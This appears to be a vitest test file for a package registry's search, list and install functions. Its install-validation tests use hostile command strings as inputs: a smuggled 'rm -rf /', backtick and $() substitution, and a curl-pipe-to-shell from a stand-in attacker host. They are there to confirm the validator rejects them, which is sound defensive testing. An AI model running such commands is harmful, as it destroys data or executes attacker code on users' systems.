import { describe, it, expect } from 'vitest';
import {
  searchRegistry,
  listRegistry,
  installPackage,
  type Registry,
  type RegistryPackage,
} from '../src/engine/registry.js';

// ---------------------------------------------------------------------------
// Test fixtures
// ---------------------------------------------------------------------------

const bundleSpring: RegistryPackage = {
  name: '@fixedcode/bundle-spring-domain',
  description: 'Spring Boot DDD domain bundle with Kotlin',
  version: '1.0.0',
  kind: 'bundle',
  tags: ['spring', 'kotlin', 'ddd'],
  author: 'fixedcode',
  repo: 'https://github.com/fixedcode-ai/bundle-spring-domain',
  install: 'npm install @fixedcode/bundle-spring-domain',
};

const generatorOpenapi: RegistryPackage = {
  name: '@fixedcode/generator-openapi',
  description: 'OpenAPI 3.0.3 spec generator from domain context',
  version: '2.0.0',
  kind: 'generator',
  tags: ['openapi', 'rest', 'api-spec'],
  author: 'fixedcode',
  install: 'npm install @fixedcode/generator-openapi',
};

const bundleHello: RegistryPackage = {
  name: '@fixedcode/bundle-hello-world',
  description: 'Minimal hello world bundle for testing',
  version: '0.1.0',
  kind: 'bundle',
  tags: ['example', 'starter'],
  author: 'community',
  install: 'npm install @fixedcode/bundle-hello-world',
};

const testRegistry: Registry = {
  version: 1,
  packages: [bundleSpring, generatorOpenapi, bundleHello],
};

// ---------------------------------------------------------------------------
// searchRegistry
// ---------------------------------------------------------------------------

describe('searchRegistry', () => {
  it('matches on name', () => {
    const results = searchRegistry(testRegistry, 'spring-domain');
    expect(results).toContain(bundleSpring);
    expect(results).not.toContain(generatorOpenapi);
  });

  it('matches on description', () => {
    const results = searchRegistry(testRegistry, 'OpenAPI 3.0.3');
    expect(results).toContain(generatorOpenapi);
    expect(results).not.toContain(bundleSpring);
  });

  it('matches on tags', () => {
    const results = searchRegistry(testRegistry, 'kotlin');
    expect(results).toContain(bundleSpring);
    expect(results).not.toContain(generatorOpenapi);
    expect(results).not.toContain(bundleHello);
  });

  it('matches on kind', () => {
    const results = searchRegistry(testRegistry, 'generator');
    expect(results).toContain(generatorOpenapi);
    expect(results).not.toContain(bundleSpring);
    expect(results).not.toContain(bundleHello);
  });

  it('is case-insensitive', () => {
    const lowerResults = searchRegistry(testRegistry, 'kotlin');
    const upperResults = searchRegistry(testRegistry, 'KOTLIN');
    const mixedResults = searchRegistry(testRegistry, 'KoTlIn');
    expect(lowerResults).toEqual(upperResults);
    expect(lowerResults).toEqual(mixedResults);
  });

  it('returns empty array when nothing matches', () => {
    const results = searchRegistry(testRegistry, 'xyzzy-no-match');
    expect(results).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// listRegistry
// ---------------------------------------------------------------------------

describe('listRegistry', () => {
  it('returns all packages when no kind filter is given', () => {
    const results = listRegistry(testRegistry);
    expect(results).toHaveLength(3);
    expect(results).toContain(bundleSpring);
    expect(results).toContain(generatorOpenapi);
    expect(results).toContain(bundleHello);
  });

  it('filters by kind — bundle', () => {
    const results = listRegistry(testRegistry, 'bundle');
    expect(results).toHaveLength(2);
    expect(results).toContain(bundleSpring);
    expect(results).toContain(bundleHello);
    expect(results).not.toContain(generatorOpenapi);
  });

  it('filters by kind — generator', () => {
    const results = listRegistry(testRegistry, 'generator');
    expect(results).toHaveLength(1);
    expect(results).toContain(generatorOpenapi);
  });

  it('returns empty array when kind has no matches', () => {
    const results = listRegistry(testRegistry, 'plugin');
    expect(results).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// installPackage — input validation only
// ---------------------------------------------------------------------------

describe('installPackage — input validation', () => {
  const projectDir = '/tmp';

  it('throws for a command containing shell metacharacters', () => {
    const malicious: RegistryPackage = {
      ...bundleSpring,
      install: 'npm install foo; rm -rf /',
    };
    expect(() => installPackage(malicious, projectDir)).toThrow('Unsafe install command');
  });

  it('throws for a command that uses backtick injection', () => {
    const malicious: RegistryPackage = {
      ...bundleSpring,
      install: 'npm install `whoami`',
    };
    expect(() => installPackage(malicious, projectDir)).toThrow('Unsafe install command');
  });

  it('throws for a command that is not npm install', () => {
    const malicious: RegistryPackage = {
      ...bundleSpring,
      install: 'curl http://evil.example.com | sh',
    };
    expect(() => installPackage(malicious, projectDir)).toThrow('Unsafe install command');
  });

  it('throws for a command with a space-separated extra argument beyond a single package', () => {
    const malicious: RegistryPackage = {
      ...bundleSpring,
      install: 'npm install foo bar',
    };
    expect(() => installPackage(malicious, projectDir)).toThrow('Unsafe install command');
  });

  it('throws with the offending command in the error message', () => {
    const cmd = 'npm install $(evil)';
    const malicious: RegistryPackage = { ...bundleSpring, install: cmd };
    expect(() => installPackage(malicious, projectDir)).toThrow(`Unsafe install command: ${cmd}`);
  });
});
